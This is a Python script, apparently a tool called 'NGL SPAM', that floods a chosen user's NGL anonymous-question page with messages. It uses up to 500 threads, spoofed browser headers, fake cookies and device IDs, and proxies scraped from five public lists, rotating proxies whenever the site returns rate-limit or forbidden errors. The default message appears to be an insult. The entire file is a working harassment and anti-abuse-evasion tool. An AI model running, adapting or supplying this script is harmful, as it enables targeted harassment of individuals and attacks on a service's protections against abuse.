import requests
import os
import sys
import time
import uuid
import random
from concurrent.futures import ThreadPoolExecutor
from pystyle import Colors, Colorate
from datetime import datetime
from bs4 import BeautifulSoup
MESSAGES = {
    'en': {
        'username_empty': "[-] Username cannot be empty",
        'invalid_count': "[-] Invalid input. Please enter a positive integer for count",
        'text_empty': "[-] Message text cannot be empty",
        'invalid_proxy_file': "[-] Invalid proxy file or not provided",
        'loading_proxies': "[!] Loading proxy list...",
        'proxies_found': "[+] Found {} proxies",
        'invalid_username': "[-] Username {} is invalid or NGL page is not working",
        'starting_spam': "\n[!] Starting spam of {} messages to {} with {} threads\n",
        'completed': "\n[!] Completed in {:.2f} seconds (Rate: {:.2f} messages/second)",
        'keyboard_interrupt': "[!] Ctrl + C pressed, script stopped.",
        'done': "\n<========== DONE ==========>",
        'success': "Successfully: {}",
        'error': "Error: {}",
        'error_summary': "<==========================>",
        'error_404': "Error 404 (Not Found) => ",
        'error_429': "Error 429 (Too Many Requests) => ",
        'error_403': "Error 403 (Forbidden) => ",
        'proxy_error': "[-] Error fetching proxies from {}: {}",
        'proxy_file_error': "[-] Error reading proxy file: {}",
        'ngl_error': "[-] Error checking NGL page: {}",
        'connection_error': "[-] Connection error with proxy {}: {}",
        'unexpected_error': "[-] Unexpected error: {}"
    }
}
def generate_random_string(length=50):
    """Generate a random string of specified length using letters and digits"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))
def random_device_id():
    return str(uuid.uuid4())

def random_cookie():
    return f"session={random_text(32)}"

def random_text(length):
    letters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return ''.join(random.choice(letters) for _ in range(length))

def get_free_proxies():
    proxy_list = []
    # Source 1: free-proxy-list.net
    try:
        url = "https://free-proxy-list.net/"
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table')
        rows = table.find_all('tr')[1:50]
        for row in rows:
            cols = row.find_all('td')
            if len(cols) >= 3:
                ip = cols[0].text
                port = cols[1].text
                proxy = f"http://{ip}:{port}"
                proxy_list.append(proxy)
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['proxy_error'].format("free-proxy-list.net", e)))

    # Source 2: proxyscrape.com
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=yes&anonymity=elite"
        response = requests.get(url, timeout=5)
        proxies = response.text.splitlines()
        proxy_list.extend([f"http://{proxy}" for proxy in proxies[:50]])
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['proxy_error'].format("proxyscrape.com", e)))

    # Source 3: proxy-list.download
    try:
        url = "https://www.proxy-list.download/api/v1/get?type=https"
        response = requests.get(url, timeout=5)
        proxies = response.text.splitlines()
        proxy_list.extend([f"http://{proxy}" for proxy in proxies[:50]])
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['proxy_error'].format("proxy-list.download", e)))

    # Source 4: geonode.com
    try:
        url = "https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc&protocols=https"
        response = requests.get(url, timeout=5)
        data = response.json()
        for proxy in data.get('data', [])[:50]:
            ip = proxy.get('ip')
            port = proxy.get('port')
            proxy_list.append(f"http://{ip}:{port}")
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['proxy_error'].format("geonode.com", e)))

    # Source 5: openproxy.space
    try:
        url = "https://api.openproxy.space/lists/http"
        response = requests.get(url, timeout=5)
        data = response.json()
        for list_item in data[:50]:
            for proxy in list_item.get('items', [])[:50]:
                proxy_list.append(f"http://{proxy}")
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['proxy_error'].format("openproxy.space", e)))

    return proxy_list if proxy_list else [None]

def load_proxies(file_path):
    if not file_path:
        return get_free_proxies()
    try:
        with open(file_path, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies or [None]
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['proxy_file_error'].format(e)))
        return get_free_proxies()

def check_ngl_page(username):
    try:
        response = requests.get(f"https://ngl.link/{username}", timeout=5)
        return response.status_code == 200
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['ngl_error'].format(e)))
        return False

def send_message(username, message, proxies_list, proxy_index, user_agents, results, start_time):
    headers = {
        'Host': 'ngl.link',
        'sec-ch-ua': '"Google Chrome";v="121", "Not)A;Brand";v="8", "Chromium";v="121"',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': random.choice(user_agents),
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://ngl.link',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'sec-fetch-user': '?1',
        'referer': f'https://ngl.link/{username}',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': random_cookie(),
        'connection': 'keep-alive',
    }

    data = {
        'username': username,
        'question': message,
        'deviceId': random_device_id(),
        'gameSlug': '',
        'referrer': '',
    }

    proxy = proxies_list[proxy_index % len(proxies_list)] if proxies_list else None
    proxies = {'http': proxy, 'https': proxy} if proxy else None
    next_proxy_index = (proxy_index + 1) % len(proxies_list) if proxies_list else proxy_index

    now = datetime.now()
    time_str = now.strftime("%H:%M:%S")
    log_message = f"[{time_str}] Sent: {data['question']} (Proxy: {proxy or 'None'})"

    try:
        response = requests.post('https://ngl.link/api/submit', headers=headers, data=data, proxies=proxies, timeout=3)

        if response.status_code == 200:
            results['success'] += 1
            print(Colorate.Color(Colors.green, f"[{time_str}] [+] {MESSAGES['en']['success'].format(results['success'])}"))
            with open("sent_messages.txt", "a") as f:
                f.write(f"{log_message} [Success] [Response: {response.text[:100]}]\n")
            return True, proxy_index
        elif response.status_code == 404:
            results['error'] += 1
            results['error404'] += 1
            print(Colorate.Color(Colors.red, f"[{time_str}] [-] Error, Code => {response.status_code}"))
            with open("sent_messages.txt", "a") as f:
                f.write(f"{log_message} [Error 404]\n")
            return True, proxy_index
        elif response.status_code == 429:
            results['error'] += 1
            results['error429'] += 1
            print(Colorate.Color(Colors.red, f"[{time_str}] [-] Error, Code => {response.status_code} (In progress .....)"))
            with open("sent_messages.txt", "a") as f:
                f.write(f"{log_message} [Error 429]\n")
            return False, next_proxy_index
        elif response.status_code == 403:
            results['error'] += 1
            results['error403'] += 1
            print(Colorate.Color(Colors.red, f"[{time_str}] [-] Error, Code => {response.status_code} (Forbidden)"))
            with open("sent_messages.txt", "a") as f:
                f.write(f"{log_message} [Error 403]\n")
            return False, next_proxy_index
        else:
            results['error'] += 1
            print(Colorate.Color(Colors.red, f"[{time_str}] [-] Error, Code => {response.status_code}"))
            with open("sent_messages.txt", "a") as f:
                f.write(f"{log_message} [Error {response.status_code}]\n")
            return False, next_proxy_index

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as e:
        results['error'] += 1
        with open("sent_messages.txt", "a") as f:
            f.write(f"[{time_str}] Connection error with proxy {proxy or 'None'}: {e}\n")
        return False, next_proxy_index

def print_usage():
    print("""\x1b[38;5;7mUsage: python3 spamngl.py \x1b[38;5;1m<\033[0m\x1b[38;5;7musername\x1b[38;5;1m> <\033[0m\x1b[38;5;7mcount\x1b[38;5;1m> <\033[0m\x1b[38;5;7mtext\x1b[38;5;1m> <\033[0m\x1b[38;5;7mproxy_file\x1b[38;5;1m>\033[0m
\x1b[38;5;7mExample: python3 spamngl.py vanducc2 50 "TreTrauNetwork" proxy.txt
Arguments:
  \x1b[38;5;1m<\x1b[38;5;7musername\x1b[38;5;1m>\x1b[38;5;7m    : NGL username (e.g., TreTrauNetwork)
  \x1b[38;5;1m<\x1b[38;5;7mcount\x1b[38;5;1m>\x1b[38;5;7m       : Number of messages to send (e.g., 50)
  \x1b[38;5;1m<\x1b[38;5;7mtext\x1b[38;5;1m>\x1b[38;5;7m        : Message text or 'random' for random messages
  \x1b[38;5;1m<\x1b[38;5;7mproxy_file\x1b[38;5;1m>\x1b[38;5;7m  : Path to proxy file (e.g., proxy.txt)
""")

def main():
    os.system('clear')
    logo = """
███╗   ██╗ ██████╗ ██╗         ███████╗██████╗  █████╗ ███╗   ███╗
████╗  ██║██╔════╝ ██║         ██╔════╝██╔══██╗██╔══██╗████╗ ████║
██╔██╗ ██║██║  ███╗██║         ███████╗██████╔╝███████║██╔████╔██║
██║╚██╗██║██║   ██║██║         ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║
██║ ╚████║╚██████╔╝███████╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
 </> TreTrauNetwork </>"""
    print(Colorate.Horizontal(Colors.red_to_purple, logo))

    if len(sys.argv) != 5:
        print_usage()
        sys.exit(1)

    username = sys.argv[1].strip().lstrip('@')
    if not username:
        print(Colorate.Color(Colors.red, MESSAGES['en']['username_empty']))
        sys.exit(1)

    try:
        count = int(sys.argv[2].strip())
        if count <= 0:
            raise ValueError("Count must be positive")
    except ValueError:
        print(Colorate.Color(Colors.red, MESSAGES['en']['invalid_count']))
        sys.exit(1)

    text = sys.argv[3].strip()
    if not text:
        print(Colorate.Color(Colors.red, MESSAGES['en']['text_empty']))
        sys.exit(1)

    proxy_file = sys.argv[4].strip()
    if not proxy_file:
        print(Colorate.Color(Colors.red, MESSAGES['en']['invalid_proxy_file']))
        sys.exit(1)

    if not check_ngl_page(username):
        print(Colorate.Color(Colors.red, MESSAGES['en']['invalid_username'].format(username)))
        sys.exit(1)

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0"
    ]

    default_messages = [
        "Ditnhaukhongg"
    ]
    threads = 500  # Mặc định 10 thread
    print(Colorate.Color(Colors.orange, MESSAGES['en']['loading_proxies']))
    proxies_list = load_proxies(proxy_file)
    print(Colorate.Color(Colors.green, MESSAGES['en']['proxies_found'].format(len(proxies_list))))
    message = random.choice(default_messages) if text.lower() == "random" else text

    print(Colorate.Color(Colors.green, MESSAGES['en']['starting_spam'].format(count, username, threads)))

    results = {'success': 0, 'error': 0, 'error404': 0, 'error429': 0, 'error403': 0}
    messages_per_thread = count // threads
    remainder = count % threads

    def worker(i):
        msg_count = messages_per_thread + 1 if i < remainder else messages_per_thread
        proxy_index = i % len(proxies_list) if proxies_list else 0
        for _ in range(msg_count):
            success, proxy_index = send_message(username, message, proxies_list, proxy_index, user_agents, results, start_time)
            if not success:
                continue

    try:
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(worker, range(threads))
        elapsed_time = time.time() - start_time
        print(Colorate.Color(Colors.orange, MESSAGES['en']['completed'].format(elapsed_time, results['success']/elapsed_time if elapsed_time > 0 else 0)))

    except KeyboardInterrupt:
        print(Colorate.Color(Colors.red, MESSAGES['en']['keyboard_interrupt']))

    print(Colorate.Color(Colors.orange, MESSAGES['en']['done']))
    print(Colorate.Color(Colors.green, MESSAGES['en']['success'].format(results['success'])))
    print(Colorate.Color(Colors.red, MESSAGES['en']['error'].format(results['error'])))
    print(Colorate.Color(Colors.orange, MESSAGES['en']['error_summary']))
    if results['error'] > 0:
        print(Colorate.Color(Colors.red, MESSAGES['en']['error_404']), Colorate.Color(Colors.white, str(results['error404'])))
        print(Colorate.Color(Colors.red, MESSAGES['en']['error_429']), Colorate.Color(Colors.white, str(results['error429'])))
        print(Colorate.Color(Colors.red, MESSAGES['en']['error_403']), Colorate.Color(Colors.white, str(results['error403'])))

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(Colorate.Color(Colors.red, MESSAGES['en']['unexpected_error'].format(e)))
